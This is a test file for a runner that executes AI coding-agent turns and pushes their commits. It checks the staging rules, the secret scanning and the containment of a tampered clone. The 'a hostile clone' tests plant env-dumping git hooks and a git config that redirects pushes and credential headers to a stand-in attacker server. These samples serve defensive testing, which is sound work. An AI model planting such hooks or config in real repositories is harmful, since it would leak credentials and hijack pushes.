import { existsSync } from 'node:fs';
import { chmod, mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { type AssignedRepository, RunFailureCode, type TurnAssignment, TurnKind } from '@coredoc/core/agent-runner';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { ClaudeExecutor } from './claude/claude-executor.js';
import { FakeCoredocApi, TOKEN, WORKSPACE } from './fake-coredoc-api.test-support.js';
import {
  BOT_TOKEN,
  bareRemote,
  FakeGithub,
  fakeImplementQuery,
  fakePlugin,
  git,
  implementAssignment,
  remoteFiles,
  remoteHead,
  repository,
  SECRET_MARKER,
  pushAsPerson,
  type SeenSession,
  type SessionStep,
} from './implement.test-support.js';
import { RunnerApiClient } from './runner-api.js';
import { Runner } from './runner.js';

const VERSIONS = { runner: '1.1.0-test' };
const BRANCH = 'coredoc/PROJ-1';
const RESULT = {
  summary: 'Added the orders export.',
  repositories: [{ key: 'orders-api', summary: 'Export endpoint' }],
};

describe('implement turns in the runner loop', () => {
  let api: FakeCoredocApi;
  let github: FakeGithub;
  let root: string;
  let scratch: string;
  let plugin: { path: string; log: string };

  beforeEach(async () => {
    api = new FakeCoredocApi();
    await api.listen();
    github = new FakeGithub();
    await github.listen();
    root = await mkdtemp(join(tmpdir(), 'runner-implement-'));
    scratch = join(root, 'scratch');
    plugin = await fakePlugin(root);
  });

  afterEach(async () => {
    await api.close();
    await github.close();
    await rm(root, { recursive: true, force: true });
  });

  async function orders(overrides: Partial<AssignedRepository> = {}) {
    const bare = await bareRemote(root, 'orders-api', { 'src/orders.ts': 'export const orders = [];\n' });
    github.add('example-org', 'orders-api');
    return { bare, repo: repository(bare, github, 'orders-api', overrides) };
  }

  function runTurn(turn: TurnAssignment, steps: SessionStep[], heartbeatIntervalMs = 60_000) {
    const seen: SeenSession[] = [];
    api.queue.push(turn);
    const client = new RunnerApiClient({ baseUrl: api.baseUrl, workspaceId: WORKSPACE, token: TOKEN });
    const runner = new Runner({
      api: client,
      versions: VERSIONS,
      heartbeatIntervalMs,
      executor: new ClaudeExecutor({
        query: fakeImplementQuery(steps, seen),
        api: client,
        scratchRoot: scratch,
        pluginPath: plugin.path,
        modelApiKey: 'sk-ant-test',
        hostEnv: { PATH: process.env.PATH },
        bot: { token: BOT_TOKEN, name: 'Coredoc Bot', email: 'bot@users.noreply.example.com' },
        retryDelay: () => 0,
      }),
    });
    return { done: runner.runOnce(), seen };
  }

  it('clones over HTTPS, works on the run branch, then commits and pushes the turn after the session', async () => {
    const { bare, repo } = await orders();
    const turn = implementAssignment([repo]);
    let sessionView: { spec: string; branch: string; origin: string; config: string } | undefined;

    const { done, seen } = runTurn(turn, [
      {
        act: async (cwd) => {
          const clone = join(cwd, 'orders-api');
          sessionView = {
            spec: await readFile(join(cwd, 'SPEC.md'), 'utf8'),
            branch: git(clone, 'branch', '--show-current'),
            origin: git(clone, 'remote', 'get-url', 'origin'),
            config: await readFile(join(clone, '.git', 'config'), 'utf8'),
          };
          await writeFile(
            join(clone, 'src', 'orders.ts'),
            'export const orders = [];\nexport const toCsv = () => "";\n',
          );
          await writeFile(join(clone, 'src', 'export.ts'), 'export {};\n');
        },
        submit: RESULT,
      },
    ]);
    await expect(done).resolves.toBe('completed');

    // The session saw the accepted spec outside the clone and the run branch checked out.
    expect(sessionView).toMatchObject({ spec: turn.acceptedSpec!.markdown, branch: BRANCH, origin: `file://${bare}` });
    expect(sessionView!.config).not.toContain(BOT_TOKEN);
    expect(seen[0]!.prompt).toContain('orders-api');
    expect(seen[0]!.toolResults.join()).toMatch(/turn is over/i);
    expect(seen[0]!.denials.join()).toMatch(/turn is over/i);

    // One commit on top of the default branch, with the trailer, author and only the agent's edits.
    const head = remoteHead(bare, BRANCH)!;
    expect(git(bare, 'log', '-1', '--format=%s%n%b%n%an <%ae>', BRANCH)).toBe(
      'wip(PROJ-1): turn 3\nCo-Authored-By: Claude <noreply@anthropic.com>\n\nCoredoc Bot <bot@users.noreply.example.com>',
    );
    expect(git(bare, 'rev-parse', `${BRANCH}~1`)).toBe(git(bare, 'rev-parse', 'main'));
    expect(remoteFiles(bare, BRANCH)).toEqual(['README.md', 'src/export.ts', 'src/orders.ts']);

    expect(api.reservations).toEqual([`${turn.turn.id}:orders-api`]);
    expect(api.results).toEqual([expect.objectContaining({ summary: 'Added the orders export.' })]);
    expect(api.completions[0]!.body).toMatchObject({
      outcome: { kind: 'ended' },
      spend: { costUsd: 1.5 },
      repositories: [{ key: 'orders-api', pushedHead: head, withheldPaths: [], workflowDiff: null, binaryPaths: [] }],
    });

    // The secret preflight ran on the staged change and the outbound commits, with an explicit git directory.
    const scans = (await readFile(plugin.log, 'utf8'))
      .trim()
      .split('\n')
      .map(
        (line) =>
          JSON.parse(line) as {
            args: string[];
            GIT_DIR: string;
            GIT_WORK_TREE: string;
            auth: string | null;
            authKey: string | null;
          },
      );
    expect(scans.map((scan) => scan.args[2])).toEqual(['commit', 'push']);
    expect(scans[1]!.args).toEqual(
      expect.arrayContaining(['--operation', 'push', '--base', 'main', '--expected-branch', BRANCH]),
    );
    expect(
      scans.every((scan) => scan.GIT_DIR?.endsWith('orders-api/.git') && scan.GIT_WORK_TREE?.endsWith('orders-api')),
    ).toBe(true);
    expect(scans[0]!.auth).toBeNull();
    expect(scans[1]!.auth).toContain('Authorization: Basic ');
    // Scoped to the assigned clone URL, never a global http setting.
    expect(scans[1]!.authKey).toBe(`http.file://${bare}.extraHeader`);

    // The bot's permissions were read with its token before the session started.
    expect(github.requests[0]).toMatchObject({
      path: '/repos/example-org/orders-api',
      authorization: `Bearer ${BOT_TOKEN}`,
      apiVersion: '2022-11-28',
    });
    expect(existsSync(scratch) ? await readdir(scratch) : []).toEqual([]);
  });

  it('an unavailable model sends the turn back to the queue without pushing the attempt’s work', async () => {
    const { bare, repo } = await orders();
    const turn = implementAssignment([repo]);

    const { done } = runTurn(turn, [
      {
        act: async (cwd) => writeFile(join(cwd, 'orders-api', 'src', 'export.ts'), 'export {};\n'),
        apiError: { error: 'server_error', status: 529, text: 'API Error: 529 Overloaded.' },
      },
    ]);
    await expect(done).resolves.toBe('completed');

    expect(remoteHead(bare, BRANCH)).toBeNull();
    expect(api.uploads).toBe(0);
    expect(api.completions[0]!.body).toMatchObject({
      outcome: { kind: 'transient', reason: expect.stringContaining('529 Overloaded') },
      spend: { costUsd: 1.5 },
      repositories: [{ key: 'orders-api', pushedHead: null }],
    });
  });

  describe('the staging rule', () => {
    async function hostile() {
      const bare = await bareRemote(root, 'orders-api', {
        'src/orders.ts': 'export const orders = [];\n',
        'docs/old.md': 'old\n',
        '.gitignore': 'dist/\n',
        '.gitattributes': '*.bin filter=lfs diff=lfs merge=lfs -text\n',
        'data/tracked.bin': 'tracked blob\n',
      });
      github.add('example-org', 'orders-api');
      return { bare, repo: repository(bare, github, 'orders-api') };
    }

    it('commits tracked edits, deletions and small new files, and withholds everything else by path', async () => {
      const { bare, repo } = await hostile();
      const workflow = 'name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n';
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            const clone = join(cwd, 'orders-api');
            const put = async (path: string, content: string | Buffer) => {
              await mkdir(join(clone, path, '..'), { recursive: true });
              await writeFile(join(clone, path), content);
            };
            await put('src/orders.ts', 'export const orders = [1];\n');
            await rm(join(clone, 'docs/old.md'));
            await put('src/new.ts', 'export {};\n');
            await put('.github/workflows/ci.yml', workflow);
            await put('.env', 'TOKEN=x\n');
            await put('config/id_rsa', 'key\n');
            await put('credentials-prod.json', '{}\n');
            await put('assets/big.json', Buffer.alloc(1024 * 1024 + 1, 'a'));
            await put('data/blob.bin', 'new blob\n');
            await put('data/tracked.bin', 'changed blob\n');
            await put('dist/out.js', 'built\n');
            await put('.gitmodules', '[submodule "x"]\n');
            await symlink('src/new.ts', join(clone, 'link.ts'));
            // A nested repository: staging it would record a gitlink.
            await put('vendor/lib/index.js', 'module.exports = 1;\n');
            git(join(clone, 'vendor/lib'), 'init', '--quiet', '-b', 'main');
            git(join(clone, 'vendor/lib'), 'add', '-A');
            git(join(clone, 'vendor/lib'), 'commit', '--quiet', '-m', 'vendored');
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');

      expect(remoteFiles(bare, BRANCH)).toEqual([
        '.gitattributes',
        '.gitignore',
        'README.md',
        'data/tracked.bin',
        'src/new.ts',
        'src/orders.ts',
      ]);
      expect(git(bare, 'show', `${BRANCH}:src/orders.ts`)).toBe('export const orders = [1];');
      // The filter-attributed tracked file kept its committed content.
      expect(git(bare, 'show', `${BRANCH}:data/tracked.bin`)).toBe('tracked blob');

      const [report] = api.completions[0]!.body.repositories!;
      expect(report!.withheldPaths).toEqual([
        '.env',
        '.github/workflows/ci.yml',
        '.gitmodules',
        'assets/big.json',
        'config/id_rsa',
        'credentials-prod.json',
        'data/blob.bin',
        'data/tracked.bin',
        'link.ts',
        'vendor/lib',
      ]);
      expect(report!.workflowDiff).toMatchObject({ paths: ['.github/workflows/ci.yml'], note: null });
      expect(report!.workflowDiff!.diff).toContain('+    runs-on: ubuntu-latest');
    });

    it('shows a workflow diff over 64 KiB, or one the secret scan flags, by its paths only', async () => {
      const { repo } = await hostile();
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            const workflows = join(cwd, 'orders-api', '.github', 'workflows');
            await mkdir(workflows, { recursive: true });
            await writeFile(join(workflows, 'big.yml'), `# ${'x'.repeat(70 * 1024)}\n`);
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');
      expect(api.completions[0]!.body.repositories![0]!.workflowDiff).toEqual({
        paths: ['.github/workflows/big.yml'],
        diff: null,
        note: expect.stringMatching(/larger than 64 KiB/),
      });

      const second = await hostile2();
      const { done: flagged } = runTurn(implementAssignment([second.repo]), [
        {
          act: async (cwd) => {
            const workflows = join(cwd, 'billing-api', '.github', 'workflows');
            await mkdir(workflows, { recursive: true });
            await writeFile(join(workflows, 'deploy.yml'), `env:\n  KEY: ${SECRET_MARKER}\n`);
          },
          submit: RESULT,
        },
      ]);
      await expect(flagged).resolves.toBe('completed');
      const report = api.completions[1]!.body.repositories![0]!;
      expect(report.workflowDiff).toEqual({
        paths: ['.github/workflows/deploy.yml'],
        diff: null,
        note: expect.stringMatching(/secret scan/),
      });
      expect(JSON.stringify(api.completions[1])).not.toContain(SECRET_MARKER);
    });

    async function hostile2() {
      const bare = await bareRemote(root, 'billing-api');
      github.add('example-org', 'billing-api');
      return { bare, repo: repository(bare, github, 'billing-api') };
    }
  });

  describe('the secret scan', () => {
    async function twoRepositories() {
      const a = await orders();
      const bare = await bareRemote(root, 'billing-api');
      github.add('example-org', 'billing-api');
      return { orders: a, billing: { bare, repo: repository(bare, github, 'billing-api', { mergeOrder: 1 }) } };
    }

    const leak = (cwd: string) =>
      writeFile(join(cwd, 'billing-api', 'keys.ts'), `export const key = '${SECRET_MARKER}';\n`);
    const editOrders = (cwd: string) =>
      writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [2];\n');

    it('a block pushes nothing and resumes the session once in the same turn; a clean rescan pushes', async () => {
      const { orders: o, billing: b } = await twoRepositories();
      const turn = implementAssignment([o.repo, b.repo]);
      const { done, seen } = runTurn(turn, [
        {
          act: async (cwd) => {
            await editOrders(cwd);
            await leak(cwd);
          },
          submit: RESULT,
        },
        {
          act: async (cwd) => {
            // While the session is re-invoked, nothing has reached either remote.
            expect(remoteHead(o.bare, BRANCH)).toBeNull();
            expect(git(join(cwd, 'orders-api'), 'rev-parse', 'HEAD')).toBe(git(o.bare, 'rev-parse', 'main'));
            await writeFile(join(cwd, 'billing-api', 'keys.ts'), 'export const key = process.env.KEY;\n');
          },
        },
      ]);
      await expect(done).resolves.toBe('completed');

      expect(seen).toHaveLength(2);
      expect(seen[1]!.options.resume).toBe(turn.run.sessionId);
      expect(seen[1]!.prompt).toContain('billing-api: keys.ts:1 (stripe.secret_key)');
      expect(seen[1]!.prompt).not.toContain(SECRET_MARKER);
      for (const bare of [o.bare, b.bare]) {
        expect(git(bare, 'rev-list', '--count', `main..${BRANCH}`)).toBe('1');
      }
      expect(git(b.bare, 'show', `${BRANCH}:keys.ts`)).toBe('export const key = process.env.KEY;');
      expect(api.completions[0]!.body).toMatchObject({ outcome: { kind: 'ended' }, spend: { costUsd: 3 } });
    });

    it('a second block fails the run with secret_scan_blocked, naming paths only, and pushes nothing', async () => {
      const { orders: o, billing: b } = await twoRepositories();
      const { done, seen } = runTurn(implementAssignment([o.repo, b.repo]), [
        {
          act: async (cwd) => {
            await editOrders(cwd);
            await leak(cwd);
          },
          submit: RESULT,
        },
        {},
      ]);
      await expect(done).resolves.toBe('completed');

      expect(seen).toHaveLength(2);
      expect(remoteHead(o.bare, BRANCH)).toBeNull();
      expect(remoteHead(b.bare, BRANCH)).toBeNull();
      expect(api.reservations).toEqual([]);
      expect(api.uploads).toBe(0);
      const { outcome } = api.completions[0]!.body;
      expect(outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.SecretScanBlocked });
      expect(JSON.stringify(outcome)).toContain('billing-api: keys.ts');
      expect(JSON.stringify(api.completions[0])).not.toContain(SECRET_MARKER);
    });
  });

  describe('a hostile clone', () => {
    let attacker: Server;
    let attackerUrl: string;
    const attackerRequests: Array<{ url?: string; authorization?: string }> = [];

    beforeEach(async () => {
      attackerRequests.length = 0;
      attacker = createServer((req, res) => {
        attackerRequests.push({ url: req.url, authorization: req.headers.authorization });
        res.writeHead(404);
        res.end();
      });
      await new Promise<void>((resolve) => attacker.listen(0, '127.0.0.1', resolve));
      attackerUrl = `http://127.0.0.1:${(attacker.address() as AddressInfo).port}`;
    });

    afterEach(async () => {
      await new Promise<void>((resolve) => attacker.close(() => resolve()));
    });

    async function hook(path: string, marker: string) {
      await mkdir(join(path, '..'), { recursive: true });
      await writeFile(path, `#!/bin/sh\necho "$0" >> ${marker}\nenv >> ${marker}\n`);
      await chmod(path, 0o755);
    }

    it('cannot redirect the push, run hooks or send the bot’s header anywhere else', async () => {
      const { bare, repo } = await orders();
      const decoy = await bareRemote(root, 'decoy');
      const marker = join(root, 'hook-ran');
      const evilHooks = join(root, 'evil-hooks');
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            const clone = join(cwd, 'orders-api');
            for (const name of ['pre-commit', 'commit-msg', 'post-commit', 'pre-push', 'reference-transaction']) {
              await hook(join(clone, '.git', 'hooks', name), marker);
              await hook(join(evilHooks, name), marker);
            }
            await hook(join(evilHooks, 'fsmonitor'), marker);
            await hook(join(evilHooks, 'helper'), marker);
            await writeFile(
              join(root, 'evil.config'),
              `[url "${attackerUrl}/included.git"]\n\tpushInsteadOf = file://${bare}\n[http]\n\textraHeader = X-Evil: 1\n`,
            );
            await writeFile(
              join(clone, '.git', 'config'),
              [
                '[core]',
                '\trepositoryformatversion = 0',
                '\tbare = false',
                `\thooksPath = ${evilHooks}`,
                `\tfsmonitor = ${join(evilHooks, 'fsmonitor')}`,
                '[credential]',
                `\thelper = !${join(evilHooks, 'helper')}`,
                '[remote "origin"]',
                `\turl = file://${decoy}`,
                `\tpushurl = ${attackerUrl}/push.git`,
                `[url "${attackerUrl}/rewritten.git"]`,
                `\tinsteadOf = file://${bare}`,
                '[include]',
                `\tpath = ${join(root, 'evil.config')}`,
                '',
              ].join('\n'),
            );
            await writeFile(join(clone, 'src', 'orders.ts'), 'export const orders = [7];\n');
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');

      expect(api.completions[0]!.body.outcome).toEqual({ kind: 'ended' });
      expect(git(bare, 'show', `${BRANCH}:src/orders.ts`)).toBe('export const orders = [7];');
      expect(remoteHead(decoy, BRANCH)).toBeNull();
      expect(attackerRequests).toEqual([]);
      expect(existsSync(marker)).toBe(false);
    });

    it('a git directory replaced by a pointer elsewhere fails the turn and pushes nothing', async () => {
      const { bare, repo } = await orders();
      const decoy = await bareRemote(root, 'decoy');
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            const clone = join(cwd, 'orders-api');
            await rm(join(clone, '.git'), { recursive: true, force: true });
            await writeFile(join(clone, '.git'), `gitdir: ${decoy}\n`);
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');
      expect(api.completions[0]!.body.outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.AgentError });
      expect(remoteHead(bare, BRANCH)).toBeNull();
      expect(remoteHead(decoy, BRANCH)).toBeNull();
    });
  });

  describe('the run branch', () => {
    it('a run branch this run did not create fails with branch_exists before any session', async () => {
      const { bare, repo } = await orders();
      await pushAsPerson(bare, BRANCH, 'theirs.txt', 'theirs\n');
      const { done, seen } = runTurn(implementAssignment([repo]), [{ submit: RESULT }]);
      await expect(done).resolves.toBe('completed');
      expect(seen).toEqual([]);
      expect(api.completions[0]!.body.outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.BranchExists });
    });

    it('a person pushing to the run branch during the turn fails the run with push_rejected', async () => {
      const { bare, repo } = await orders({ branchCreated: true });
      const ours = await pushAsPerson(bare, BRANCH, 'earlier-turn.txt', 'pushed by an earlier turn\n');
      let theirs = '';
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            await writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [3];\n');
            theirs = await pushAsPerson(bare, BRANCH, 'person.txt', 'a person\n');
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');
      expect(theirs).not.toBe(ours);
      expect(remoteHead(bare, BRANCH)).toBe(theirs);
      expect(api.completions[0]!.body.outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.PushRejected });
    });

    it('a push that fails for a later repository still reports the heads already pushed', async () => {
      const { bare: ordersBare, repo: ordersRepo } = await orders();
      const billingBare = await bareRemote(root, 'billing', { 'src/billing.ts': 'export const billing = 0;\n' });
      github.add('example-org', 'billing');
      const billingRepo = repository(billingBare, github, 'billing', { mergeOrder: 1 });
      const { done } = runTurn(implementAssignment([ordersRepo, billingRepo]), [
        {
          act: async (cwd) => {
            await writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [5];\n');
            await writeFile(join(cwd, 'billing', 'src', 'billing.ts'), 'export const billing = 5;\n');
            // The billing remote stops accepting objects, so only its push fails.
            await chmod(join(billingBare, 'objects'), 0o555);
          },
          submit: RESULT,
        },
      ]);
      try {
        await expect(done).resolves.toBe('completed');
      } finally {
        await chmod(join(billingBare, 'objects'), 0o755);
      }

      const pushed = remoteHead(ordersBare, BRANCH);
      expect(pushed).toBeTruthy();
      expect(remoteHead(billingBare, BRANCH)).toBeNull();
      expect(api.completions[0]!.body).toMatchObject({
        outcome: { kind: 'failed', code: RunFailureCode.GithubError },
        repositories: [
          expect.objectContaining({ key: 'orders-api', pushedHead: pushed }),
          expect.objectContaining({ key: 'billing', pushedHead: null }),
        ],
      });
    });

    it('a retried attempt that died between reserving and pushing creates the branch and pushes', async () => {
      const { bare, repo } = await orders({ branchCreated: true });
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: (cwd) => writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [4];\n'),
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');
      expect(git(bare, 'rev-parse', `${BRANCH}~1`)).toBe(git(bare, 'rev-parse', 'main'));
      // Already reserved by the lost attempt: no second reservation.
      expect(api.reservations).toEqual([]);
      expect(api.completions[0]!.body.outcome).toEqual({ kind: 'ended' });
    });

    it('a retried attempt that died between pushing and completing continues on the pushed branch', async () => {
      const { bare, repo } = await orders({ branchCreated: true });
      const pushed = await pushAsPerson(bare, BRANCH, 'src/export.ts', 'export {};\n');
      let seenInSession = '';
      const { done } = runTurn(implementAssignment([repo]), [
        {
          act: async (cwd) => {
            seenInSession = await readFile(join(cwd, 'orders-api', 'src', 'export.ts'), 'utf8');
          },
          submit: RESULT,
        },
      ]);
      await expect(done).resolves.toBe('completed');
      expect(seenInSession).toBe('export {};\n');
      // Nothing new to push; the branch the lost attempt pushed is reported, so the run counts it as touched.
      expect(remoteHead(bare, BRANCH)).toBe(pushed);
      expect(api.completions[0]!.body.repositories).toEqual([expect.objectContaining({ pushedHead: pushed })]);
    });
  });

  describe('the bot account', () => {
    it('an admin or maintainer bot is refused before any session or clone, in scope turns too', async () => {
      const { repo } = await orders();
      github.add('example-org', 'orders-api', { maintain: true });
      const { done, seen } = runTurn(implementAssignment([repo]), [{ submit: RESULT }]);
      await expect(done).resolves.toBe('completed');
      expect(seen).toEqual([]);
      expect(api.completions[0]!.body.outcome).toMatchObject({
        kind: 'failed',
        code: RunFailureCode.RepositoryNotEligible,
        reason: expect.stringMatching(/admin or maintain/),
      });

      github.add('example-org', 'orders-api', { admin: true });
      const scope = implementAssignment([repo]);
      const { done: scopeDone, seen: scopeSeen } = runTurn(
        { ...scope, turn: { ...scope.turn, kind: TurnKind.Scope }, acceptedSpec: null, prd: { markdown: '# PRD' } },
        [{}],
      );
      await expect(scopeDone).resolves.toBe('completed');
      expect(scopeSeen).toEqual([]);
      expect(api.completions[1]!.body.outcome).toMatchObject({
        kind: 'failed',
        code: RunFailureCode.RepositoryNotEligible,
      });
    });

    it('GitHub server errors are retried three times in process, then fail the run with github_error', async () => {
      const { repo } = await orders();
      github.repositories.get('example-org/orders-api')!.failures = 3;
      const { done } = runTurn(implementAssignment([repo]), [{ submit: RESULT }]);
      await expect(done).resolves.toBe('completed');
      expect(api.completions[0]!.body.outcome).toEqual({ kind: 'ended' });
      expect(github.requests).toHaveLength(4);

      github.repositories.get('example-org/orders-api')!.failures = 4;
      const { done: second, seen } = runTurn(implementAssignment([repo]), [{ submit: RESULT }]);
      await expect(second).resolves.toBe('completed');
      expect(seen).toEqual([]);
      expect(api.completions[1]!.body.outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.GithubError });
    });

    it('a clone that keeps failing fails the run with github_error', async () => {
      const { repo } = await orders();
      const { done, seen } = runTurn(implementAssignment([{ ...repo, cloneUrl: `file://${root}/missing.git` }]), [{}]);
      await expect(done).resolves.toBe('completed');
      expect(seen).toEqual([]);
      expect(api.completions[0]!.body.outcome).toMatchObject({ kind: 'failed', code: RunFailureCode.GithubError });
    });
  });

  it('a stop from the server ends the session, skips the push and does not complete the turn', async () => {
    const { bare, repo } = await orders();
    api.heartbeatAnswer = 'stop';
    const { done } = runTurn(
      implementAssignment([repo]),
      [
        {
          act: (cwd) => writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [6];\n'),
          untilStopped: true,
        },
      ],
      10,
    );
    await expect(done).resolves.toBe('stopped');
    expect(remoteHead(bare, BRANCH)).toBeNull();
    expect(api.completions).toEqual([]);
    expect(existsSync(scratch) ? await readdir(scratch) : []).toEqual([]);
  });

  describe('checkpoints', () => {
    const edit = (cwd: string) =>
      writeFile(join(cwd, 'orders-api', 'src', 'orders.ts'), 'export const orders = [5];\n');

    it('the SDK turn cap pushes the work and reports a checkpoint, not a failure', async () => {
      const { bare, repo } = await orders();
      const { done } = runTurn(implementAssignment([repo]), [{ act: edit, resultSubtype: 'error_max_turns' }]);
      await expect(done).resolves.toBe('completed');
      expect(remoteHead(bare, BRANCH)).not.toBeNull();
      expect(api.uploads).toBe(1);
      expect(api.completions[0]!.body.outcome).toEqual({ kind: 'checkpoint' });
    });

    it('the duration limit tells the session to stop, then pushes the work and reports a checkpoint', async () => {
      const { bare, repo } = await orders();
      const base = implementAssignment([repo]);
      const turn = { ...base, run: { ...base.run, maxTurnDurationSeconds: 1 } };
      const { done, seen } = runTurn(turn, [{ act: edit, untilStopped: true }]);
      await expect(done).resolves.toBe('completed');
      expect(seen[0]!.denials.join()).toMatch(/duration limit/);
      expect(remoteHead(bare, BRANCH)).not.toBeNull();
      // The session ended by itself, so its spend is known.
      expect(api.completions[0]!.body).toMatchObject({ outcome: { kind: 'checkpoint' }, spend: { costUsd: 1.5 } });
    });
  });
});
